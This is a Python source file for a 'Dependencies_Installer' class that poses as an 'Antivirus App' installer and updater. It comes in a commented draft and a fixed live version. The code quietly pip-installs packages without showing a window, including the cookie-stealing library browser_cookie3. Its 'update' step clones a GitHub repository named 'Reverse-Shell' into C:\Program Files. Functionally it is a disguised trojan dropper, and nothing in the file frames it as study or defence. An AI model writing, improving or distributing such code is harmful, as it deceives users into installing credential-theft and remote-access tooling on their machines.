# from importlib import import_module,invalidate_caches
# import subprocess,sys,os

# class Dependencies_Installer:
#     def __init__(self):
#         self.deps = ["tk","urllib3","socket","os","shutil","platform","psutil","stat","sys","browser_cookie3"]

#     def start(self):
#         if self.internet_con() == True:
#             self.install_dependencies()
#             self.updateapp()

#     def install_dependencies(self):
#         from tkinter import messagebox
#         messagebox.showinfo(title='Antivirus App(Installer)',message='Dependencies installing... please be patient, So click ok to continue')
#         for installing in self.deps:
#             try:
#                 invalidate_caches()
#                 import_module(installing)
#             except ModuleNotFoundError:
#                 subprocess.check_call([sys.executable,'-m','install',installing],creationflags=subprocess.CREATE_NO_WINDOW)
#             except Exception as e:
#                 messagebox.showerror(title='Antivirus App(Installer)',message=f'Error : {e}')
#         messagebox.showinfo(title='Antivirus App(Installer)',message='Dependecies installed successfully')
#         sys.exit(0)

#     def updateapp(self):
#         from tkinter import messagebox
#         target_dir = 'C:\\Program Files'
#         os.chdir(target_dir)
#         try:
#             subprocess.check_call(['git','clone','https://github.com/H-ckingTools/Reverse-Shell.git'])
#         except Exception as e:
#             messagebox.showerror(title='Antivirus App(Updater)',message=f'Update failed : {e}')

#     def internet_con(self):
#         import urllib3
#         from tkinter import messagebox
#         make_req = urllib3.PoolManager()
#         try:
#             make_req.request('GET','www.google.com')
#             return True
#         except Exception:
#             messagebox.showerror(title='Antivirus App',message='Turn on your internet')

from importlib import import_module, invalidate_caches
import subprocess, sys, os

class Dependencies_Installer:
    def __init__(self):
        self.deps = ["tk", "urllib3", "socket", "os", "shutil", "platform", "psutil", "stat", "sys", "browser_cookie3"]

    def start(self):
        if self.internet_con():
            self.install_dependencies()
            self.updateapp()

    def install_dependencies(self):
        from tkinter import messagebox
        messagebox.showinfo(
            title='Antivirus App (Installer)',
            message='Dependencies installing... Please be patient. Click OK to continue.'
        )

        for installing in self.deps:
            try:
                invalidate_caches()
                import_module(installing)
            except ModuleNotFoundError:
                try:
                    subprocess.check_call(
                        [sys.executable, '-m', 'pip', 'install', installing],
                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
                    )
                except Exception as e:
                    messagebox.showerror(
                        title='Antivirus App (Installer)',
                        message=f'Failed to install {installing}:\n{e}'
                    )
            except Exception as e:
                messagebox.showerror(
                    title='Antivirus App (Installer)',
                    message=f'Error importing {installing}:\n{e}'
                )

        messagebox.showinfo(
            title='Antivirus App (Installer)',
            message='Dependencies installed successfully!'
        )
        sys.exit(0)

    def updateapp(self):
        from tkinter import messagebox
        target_dir = 'C:\\Program Files'
        try:
            os.chdir(target_dir)
            subprocess.check_call(['git', 'clone', 'https://github.com/H-ckingTools/Reverse-Shell.git'])
        except Exception as e:
            messagebox.showerror(
                title='Antivirus App (Updater)',
                message=f'Update failed:\n{e}'
            )

    def internet_con(self):
        import urllib3
        from tkinter import messagebox
        make_req = urllib3.PoolManager()
        try:
            make_req.request('GET', 'http://www.google.com')
            return True
        except Exception:
            messagebox.showerror(
                title='Antivirus App',
                message='Turn on your internet connection.'
            )
            return False

# Example usage:
# installer = Dependencies_Installer()
# installer.start()
